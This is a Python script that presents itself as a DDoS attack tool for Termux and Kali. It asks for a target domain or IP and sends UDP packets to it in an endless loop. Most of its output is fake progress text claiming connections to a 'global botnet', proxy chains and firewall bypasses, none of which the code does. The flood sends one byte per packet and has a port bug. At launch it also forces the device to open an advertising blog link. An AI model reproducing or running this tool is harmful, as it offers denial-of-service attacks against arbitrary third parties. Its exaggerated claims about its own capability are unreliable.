import os
import sys
import time
import socket
import random
import webbrowser
from platform import system

# --- ULTRA HIGHLIGHTED COLORS ---
W = '\033[1;37m'  # White Bold
G = '\033[1;32m'  # Green Bold
R = '\033[1;31m'  # Red Bold
Y = '\033[1;33m'  # Yellow Bold
B = '\033[1;34m'  # Blue Bold
C = '\033[1;36m'  # Cyan Bold
M = '\033[1;35m'  # Magenta Bold
RE = '\033[0m'    # Reset
# Background Highlights
HG = '\033[1;42;30m' # Highlight Green
HR = '\033[1;41;37m' # Highlight Red
HB = '\033[1;44;37m' # Highlight Blue
HC = '\033[1;46;30m' # Highlight Cyan



def clear():
    os.system('cls' if system() == "Windows" else 'clear')

def redirect_system():
    url = "https://quicktechtipsbd.blogspot.com/2026/01/ads.html"
    
    # Colors
    Y = '\033[1;33m'
    RE = '\033[0m'
    
    print(f'{Y}[!] FIRST VISIT OUR BLOGPOST MUST..... {RE}')
    time.sleep(1.5)
    
    try:
        # Method 1: Android Native Intent (সবচেয়ে শক্তিশালী পদ্ধতি)
        # এটি সরাসরি ফোনকে নির্দেশ দেয় অ্যাপ ওপেন করতে
        os.system(f"am start -a android.intent.action.VIEW -d {url} > /dev/null 2>&1")
        
        # Method 2: Termux API (ব্যাকআপ)
        os.system(f"termux-open-url {url} > /dev/null 2>&1")
        
        # Method 3: Standard Webbrowser (PC/Kali এর জন্য)
        if system() != "Linux" or "ANDROID_ROOT" not in os.environ:
             webbrowser.open(url)
             
    except Exception as e:
        pass
        
    time.sleep(2)

def logo():
    clear()
    print(f"""
{C}  ████████╗███████╗ █████╗ ███╗   ███╗      ██████╗███████╗██╗   ██╗ ██████╗ █████╗ 
{C}  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║     ██╔════╝╚══███╔╝██║   ██║██╔════╝██╔══██╗
{C}     ██║   █████╗  ███████║██╔████╔██║     ██║       ███╔╝ ██║   ██║██║     ███████║
{C}     ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║     ██║      ███╔╝  ██║   ██║██║     ██╔══██║
{C}     ██║   ███████╗██║  ██║██║ ╚═╝ ██║     ╚██████╗███████╗╚██████╔╝╚██████╗██║  ██║
{C}     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝      ╚═════╝╚══════╝ ╚═════╝ ╚═════╝╚═╝  ╚═╝
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      {HG} SYSTEM: DDOS BY CZUCA. {RE}   {HB} VERSION: 1.0 {RE}
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   {C}[>]{W} DEVELOPER : {Y}MR.LEVIATHAN
   {C}[>]{W} STATUS    : {G}ONLINE
   {C}[>]{W} MODULE    : {R}DDOS_ATTACK
   {C}[>]{W} WARNING   : {G}DO NOT PUBLIC THIS TOOL.
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}
    """)
def slow_print(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

def startup():
    clear()
    print(f"\n\n{B}[>] {W}BOOTING THE SYSTEM DDOS-TOOL.........")
    time.sleep(1)

    # 1. Connecting to Botnet
    sys.stdout.write(f"\r{B}[~] {W}CONNECTING TO GLOBAL BOTNET SERVER...")
    sys.stdout.flush()
    time.sleep(1.5)
    sys.stdout.write(f"\r{B}[✔] {G}CONNECTED TO GLOBAL BOTNET SERVER!   \n")

    # 2. Establishing Proxy
    sys.stdout.write(f"\r{B}[~] {W}ESTABLISHING SECURE PROXY CHAINS...")
    sys.stdout.flush()
    time.sleep(1.2)
    sys.stdout.write(f"\r{B}[✔] {G}SECURE PROXY CHAINS ESTABLISHED!    \n")

    # 3. Loading Scripts
    sys.stdout.write(f"\r{B}[~] {W}UPDATING ATTACK METHODS & SCRIPTS...")
    sys.stdout.flush()
    time.sleep(1.0)
    sys.stdout.write(f"\r{B}[✔] {G}ATTACK METHODS & SCRIPTS UPDATED!   \n")

    # 4. Bypassing Security
    sys.stdout.write(f"\r{B}[~] {W}BYPASSING FIREWALL SECURITY LAYERS...")
    sys.stdout.flush()
    time.sleep(1.5)
    sys.stdout.write(f"\r{B}[✔] {G}FIREWALL SECURITY LAYERS BYPASSED!  \n")

    print(f"\n{Y}FINALIZING SETUP...")
    
    # Progress Bar Loop
    for i in range(1, 101, 5):
        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
        sys.stdout.flush()
        time.sleep(0.05)
        
    print(f"\n\n{HG}  SUCCESS: ALL SERVER CONNETION LOADED SUCCESSFULLY... {RE}\n")
    time.sleep(1.5)
# Initialize Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1)
redirect_system()
startup()

while True:
    logo()
    
    # মেনু হেডলাইন
    print(f" {HC}  SELECTION INTERFACE  {RE} ")
    time.sleep(0.05)  # অল্প বিরতি
    
    # অপশন ১
    print(f"\n {G}[1]{W} ATTACK DOMAIN")
    time.sleep(0.05)
    
    # অপশন ২
    print(f" {G}[2]{W} ATTACK TARGET IP")
    time.sleep(0.05)
    
    # অপশন ৩
    print(f" {G}[3]{W} VIEW CREDITS")
    time.sleep(0.05)
    
    # অপশন ০
    print(f" {R}[0]{W} TERMINATE SYSTEM")
    time.sleep(0.05)
    
    # ইনপুট সেকশন
    print(f"\n{C}╔═══[{G}CZUCA@METHOD{C}]")
    choice = input(f"{C}╚══{B}> {Y}")
    
    # এরপর আপনার logic (if/else) বসবে...

    if choice == '1':
        domain = input(f"\n{B}[?]{W} TARGET URL: {Y}")
        try:
            ip = socket.gethostbyname(domain)
            break
        except:
            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
            time.sleep(2)
    elif choice == '2':
        ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
        break
    elif choice == '3':
        print(f"\n{HB}  DEVELOPER INFO  {RE}")
        print(f"{W}Created by  : {G}LEVIATHAN DRIFT 419")
        print(f"{W}Telegram    : {C}@Mr_Leviathan221")
        print(f"{W}Status      : {Y}RELEASED")
        input(f"\n{M}BACK TO MENU (ENTER)...")
    elif choice == '0' or choice == '00':
        print(f"{HR} SHUTTING DOWN... {RE}")
        sys.exit()
    else:
        print(f"{HR} INVALID SELECTION {RE}")
        time.sleep(1)

# Attack Setup
logo()
print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
print(f"\n{W}TARGET IP  : {R}{ip}")
port_choice = input(f"{W}SET CUSTOM PORT? (y/n): {Y}").lower()

if port_choice == "y":
    port = int(input(f"{B}[?]{W} ENTER PORT: {Y}"))
    port_mode = True
else:
    port = 1
    port_mode = False

# Warning Header
print(f"\n{HR}  WARNING: ATTACK STARTING IN 3 SECONDS  {RE}\n")

# --- VISUAL 1: T-Minus Countdown (টাইমার) ---
for i in range(3, 0, -1):
    sys.stdout.write(f"\r{R}[!] SYSTEM OVERLOAD IN... {i}")
    sys.stdout.flush()
    time.sleep(1)
sys.stdout.write(f"\r{R}[!] SYSTEM OVERLOAD IN... 0\n")

# --- VISUAL 2: Packet Building (স্পিনিং হুইল) ---
animations = ["|", "/", "-", "\\"]
for i in range(15):  # 1.5 seconds loop
    sys.stdout.write(f"\r{Y}[~] COMPILING MALICIOUS PACKETS... {animations[i % 4]}")
    sys.stdout.flush()
    time.sleep(0.1)
print(f"\r{G}[✔] MALICIOUS PACKETS COMPILED SUCCESSFULLY!      ")

# --- VISUAL 3: Rapid Data Injection (স্ক্রলিং টেক্সট) ---
print(f"{C}[+] INJECTING PAYLOAD STREAM:")
payloads = [
    "   > Bypassing Firewall Layer 7...",
    "   > Handshaking with Zombie Nodes...",
    "   > Flooding Port 80/443 (TCP/UDP)...",
    "   > Maximizing Bandwidth Usage...",
    "   > TARGET LOCKED: SENDING BYTES..."
]

for text in payloads:
    sys.stdout.write(f"{R}{text}\n")
    time.sleep(0.5)  # প্রতিটি লাইনের মাঝে ফাস্ট গ্যাপ

# Final Attack Trigger
print(f"\n{HR}  [☠] ATTACK LAUNCHED SUCCESSFULLY [☠]  {RE}")
sent = 0
try:
    while True:
        if not port_mode:
            port = port + 1 if port < 0 else 1
        
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        
        # Highlighted Attack Log
        print(f"{G}CZUCA_ON_STRIKE {W}>> {R}{ip}{W} | {B}PORT:{Y}{port} {W}| {HG} SENT:{sent} {RE}")
        
        # Optional: very small sleep to prevent Termux crash on some devices
        # time.sleep(0.001) 

except KeyboardInterrupt:
    print(f"\n\n{HR}  ATTACK ABORTED BY USER  {RE}")
    print(f"{HC} TOTAL DATA PACKETS SENT: {sent} {RE}")
    time.sleep(3)
